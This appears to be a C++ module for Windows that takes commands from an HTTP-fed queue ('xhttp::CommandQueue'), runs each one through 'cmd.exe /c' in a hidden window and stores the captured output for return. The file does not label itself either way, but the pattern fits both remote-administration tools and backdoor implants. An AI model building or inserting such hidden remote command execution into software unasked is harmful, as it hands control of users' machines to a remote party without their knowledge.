#include <winsock2.h>
#include <windows.h>
#include <string>
#include <iostream>
#include "xhttp.h"
#include <map>

namespace wincmd {

std::string command_dir() {
    constexpr DWORD bufferLength = MAX_PATH;
    char buffer[MAX_PATH];

    if (GetCurrentDirectoryA(bufferLength, buffer) != 0) {
        return std::string(buffer);
    } else {
        // Return an empty string or handle the error as needed
        return "";
    }
}

bool execute_cmd(xhttp::CommandQueue& queue, std::string& current_dir, DWORD time_out) {
    current_dir = command_dir();
    const int block_size = 512;
    SECURITY_ATTRIBUTES sa;
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    sa.nLength = sizeof(sa);
    HANDLE read_hd = NULL;
    HANDLE write_hd = NULL;
    BOOL ret = CreatePipe(&read_hd, &write_hd, &sa, 64 * 0x1000);

    if (!ret) {
        return false;
    }

    if (!queue.empty()) {
        // Get an iterator to the first element
        auto it = queue.begin();
        // Access the command info
        auto& cmdqueue = it->second; 
        // Access cmdValue, cmdString, cmdResponse
        std::string cmdGroup = cmdqueue.Group;
        std::string cmdString = cmdqueue.String;
        std::string cmdResponse = cmdqueue.Response;

		cmdResponse.clear();

        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        GetStartupInfoA(&si);
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;
        si.hStdOutput = write_hd;
        std::string cmd = "cmd.exe /c " + cmdString;
        ret = CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE, 0, NULL, current_dir.c_str(), &si, &pi);
        CloseHandle(write_hd);

        if (!ret) {
            CloseHandle(read_hd);
            return false;
        }

        if (WaitForSingleObject(pi.hProcess, time_out) == WAIT_TIMEOUT) {
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(read_hd);
            return false;
        }

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        bool result = false;
        char* buffer = new(std::nothrow) char[block_size];

        if (buffer == nullptr) {
            CloseHandle(read_hd);
            return false;
        }

        while (1) {
            DWORD read_len = 0;
            if (ReadFile(read_hd, buffer, block_size, &read_len, NULL)) {
                cmdResponse.append(buffer, read_len);
                if (block_size > read_len) {
                    result = true;
                    break;
                }
            }
            else {
                if (GetLastError() == ERROR_BROKEN_PIPE) {
                    result = true;
                    break;
                }
            }
        }

		// Update CommandInfo structure with cmdResponse
        cmdqueue.Response = cmdResponse;
		cmdGroup.clear();
		cmdString.clear();
        CloseHandle(read_hd);
        delete[] buffer;
    }
    current_dir.clear();
    return true;
}

}